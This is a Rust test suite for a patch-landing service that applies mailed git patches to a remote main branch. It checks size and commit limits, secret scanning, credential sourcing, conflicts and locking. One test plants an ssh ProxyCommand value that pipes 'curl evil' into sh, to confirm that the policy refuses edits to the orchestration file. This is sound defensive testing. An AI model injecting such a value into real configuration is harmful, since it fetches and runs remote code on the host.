use std::collections::BTreeMap;
use std::fs::{self, OpenOptions};
use std::path::PathBuf;

use north_core::fleet::attachments::base64;
use north_ops::ops::remote_serve::south_land::{self, Config, MAX_COMMITS, MAX_PATCH_BYTES, Refusal, TOKEN_FILE};
use north_ops::ops::remote_serve::south_policy;
use rustix::fs::{FlockOperation, flock};
use tempfile::TempDir;

use super::south_test_repo::{Repo, git};

const FILE_TOKEN: &str = "ghs_from_the_credentials_file";
const SENTINEL: &str = "ghs_sentinel_from_GH_TOKEN";

struct World {
    root: TempDir,
    remote: PathBuf,
    author: Repo,
    base: String,
}

impl World {
    fn new() -> Self {
        let root = TempDir::new().expect("tempdir");
        let seed = Repo::new();
        seed.write("agents/decisions/old.md", "old\n");
        seed.write("agents/orchestration.toml", "ssh = \"nexus\"\n");
        let base = seed.commit_all("base");
        git(seed.path(), &["branch", "-M", "main"]);
        let remote = root.path().join("remote.git");
        git(root.path(), &["clone", "-q", "--bare", &seed.path().to_string_lossy(), &remote.to_string_lossy()]);
        let author = Repo::new();
        git(author.path(), &["remote", "add", "origin", &remote.to_string_lossy()]);
        git(author.path(), &["pull", "-q", "origin", "main"]);
        Self { root, remote, author, base }
    }

    fn config(&self, betterleaks: &str) -> Config {
        Config { state_dir: self.root.path().join("state"), remote: self.remote.to_string_lossy().into_owned(), betterleaks: PathBuf::from(betterleaks) }
    }

    fn credentials(&self) -> PathBuf {
        let directory = self.root.path().join("credentials");
        fs::create_dir_all(&directory).expect("mkdir");
        fs::write(directory.join(TOKEN_FILE), format!("{FILE_TOKEN}\n")).expect("token");
        directory
    }

    fn environment(&self) -> BTreeMap<String, String> {
        BTreeMap::from([
            ("PATH".to_owned(), std::env::var("PATH").expect("PATH")),
            ("CREDENTIALS_DIRECTORY".to_owned(), self.credentials().to_string_lossy().into_owned()),
            ("GH_TOKEN".to_owned(), SENTINEL.to_owned()),
            ("GITHUB_TOKEN".to_owned(), SENTINEL.to_owned()),
        ])
    }

    fn commit(&self, path: &str, content: &str) {
        self.author.write(path, content);
        self.author.commit_all(&format!("south edit {path}"));
    }

    fn mbox(&self) -> Vec<u8> {
        let range = format!("{}..HEAD", self.base);
        let output = std::process::Command::new("git").current_dir(self.author.path()).args(["format-patch", "--stdout", &range]).output().expect("format-patch");
        output.stdout
    }

    fn remote_head(&self) -> String {
        git(&self.remote, &["rev-parse", "refs/heads/main"])
    }

    fn remote_file(&self, path: &str) -> String {
        git(&self.remote, &["show", &format!("refs/heads/main:{path}")])
    }

    fn record_push_header(&self) -> PathBuf {
        let record = self.root.path().join("push-header");
        let hook = self.remote.join("hooks/pre-receive");
        fs::create_dir_all(hook.parent().expect("hooks")).expect("hooks");
        north_core::foundation::shim::write_script(&hook, &format!("printf '%s' \"$GIT_CONFIG_VALUE_0\" > '{}'\n", record.display()));
        record
    }
}

#[test]
fn south_land_a_decisions_patch_lands_on_the_remote_main() {
    let world = World::new();
    world.commit("agents/decisions/new.md", "landed\n");
    let landed = south_land::land(&world.config("true"), &world.environment(), &world.mbox()).expect("lands");
    assert_eq!(world.remote_head(), landed.sha);
    assert_eq!(world.remote_file("agents/decisions/new.md"), "landed");
    assert_eq!(git(&world.remote, &["rev-list", "--count", &format!("{}..main", world.base)]), "1");
}

#[test]
fn south_land_a_second_patch_lands_on_top_of_the_first_in_the_same_clone() {
    let world = World::new();
    world.commit("agents/decisions/one.md", "one\n");
    south_land::land(&world.config("true"), &world.environment(), &world.mbox()).expect("first lands");
    let after_first = world.remote_head();
    git(world.author.path(), &["reset", "-q", "--hard", &world.base]);
    world.commit("agents/postmortems/two.md", "two\n");
    let landed = south_land::land(&world.config("true"), &world.environment(), &world.mbox()).expect("second lands");
    assert_eq!(git(&world.remote, &["rev-parse", &format!("{}^", landed.sha)]), after_first);
    assert_eq!(world.remote_file("agents/decisions/one.md"), "one");
}

#[test]
fn south_land_a_planted_orchestration_patch_leaves_the_remote_unchanged() {
    let world = World::new();
    world.commit("agents/decisions/fine.md", "fine\n");
    world.commit("agents/orchestration.toml", "ssh = \"-oProxyCommand=curl evil | sh\"\n");
    let before = world.remote_head();
    let refusal = south_land::land(&world.config("true"), &world.environment(), &world.mbox()).expect_err("refused");
    assert_eq!(refusal, Refusal::Policy(south_policy::Refusal::Path("agents/orchestration.toml".to_owned())));
    assert_eq!(world.remote_head(), before);
}

#[test]
fn south_land_a_patch_over_4_mib_is_refused_without_touching_the_remote() {
    let world = World::new();
    world.commit("agents/decisions/big.md", &"x".repeat(MAX_PATCH_BYTES));
    let before = world.remote_head();
    let mbox = world.mbox();
    assert!(mbox.len() > MAX_PATCH_BYTES);
    assert_eq!(south_land::land(&world.config("true"), &world.environment(), &mbox), Err(Refusal::TooLarge(mbox.len())));
    assert_eq!(world.remote_head(), before);
}

#[test]
fn south_land_a_patch_of_21_commits_is_refused_and_20_lands() {
    let world = World::new();
    for number in 0..=MAX_COMMITS {
        world.commit(&format!("agents/decisions/n{number}.md"), "n\n");
    }
    let before = world.remote_head();
    assert_eq!(south_land::land(&world.config("true"), &world.environment(), &world.mbox()), Err(Refusal::TooManyCommits(MAX_COMMITS + 1)));
    assert_eq!(world.remote_head(), before);
    git(world.author.path(), &["reset", "-q", "--hard", "HEAD~1"]);
    south_land::land(&world.config("true"), &world.environment(), &world.mbox()).expect("20 commits land");
    assert_eq!(git(&world.remote, &["rev-list", "--count", &format!("{}..main", world.base)]), MAX_COMMITS.to_string());
}

#[test]
fn south_land_the_push_reads_its_token_only_from_the_credentials_directory() {
    let world = World::new();
    world.commit("agents/decisions/new.md", "landed\n");
    let record = world.record_push_header();
    south_land::land(&world.config("true"), &world.environment(), &world.mbox()).expect("lands");
    let expected = format!("Authorization: Basic {}", base64(format!("x-access-token:{FILE_TOKEN}").as_bytes()));
    assert_eq!(fs::read_to_string(record).expect("hook ran"), expected);
}

#[test]
fn south_land_without_a_credentials_directory_a_gh_token_in_the_environment_does_not_push() {
    let world = World::new();
    world.commit("agents/decisions/new.md", "landed\n");
    let mut environment = world.environment();
    environment.remove("CREDENTIALS_DIRECTORY");
    let before = world.remote_head();
    assert!(matches!(south_land::land(&world.config("true"), &environment, &world.mbox()), Err(Refusal::Credentials(_))));
    assert_eq!(world.remote_head(), before);
}

#[test]
fn south_land_a_failing_secret_scan_leaves_the_remote_unchanged() {
    let world = World::new();
    world.commit("agents/decisions/new.md", "landed\n");
    let before = world.remote_head();
    assert!(matches!(south_land::land(&world.config("false"), &world.environment(), &world.mbox()), Err(Refusal::Secrets(_))));
    assert_eq!(world.remote_head(), before);
}

#[test]
fn south_land_a_patch_that_does_not_apply_to_the_remote_main_is_refused() {
    let world = World::new();
    world.commit("agents/decisions/old.md", "changed under us\n");
    let mbox = world.mbox();
    let other = Repo::new();
    git(other.path(), &["remote", "add", "origin", &world.remote.to_string_lossy()]);
    git(other.path(), &["pull", "-q", "origin", "main"]);
    other.write("agents/decisions/old.md", "different\n");
    other.commit_all("diverge");
    git(other.path(), &["push", "-q", "origin", "HEAD:main"]);
    let before = world.remote_head();
    let refusal = south_land::land(&world.config("true"), &world.environment(), &mbox).expect_err("conflict");
    assert!(matches!(refusal, Refusal::Apply(_)), "{refusal:?}");
    assert_eq!(world.remote_head(), before);
}

#[test]
fn south_land_a_second_land_while_one_runs_is_busy() {
    let world = World::new();
    world.commit("agents/decisions/new.md", "landed\n");
    let config = world.config("true");
    fs::create_dir_all(&config.state_dir).expect("state");
    let held = OpenOptions::new().create(true).truncate(false).write(true).open(config.state_dir.join("lock")).expect("lock file");
    flock(&held, FlockOperation::NonBlockingLockExclusive).expect("hold");
    let before = world.remote_head();
    assert_eq!(south_land::land(&config, &world.environment(), &world.mbox()), Err(Refusal::Busy));
    assert_eq!(world.remote_head(), before);
}
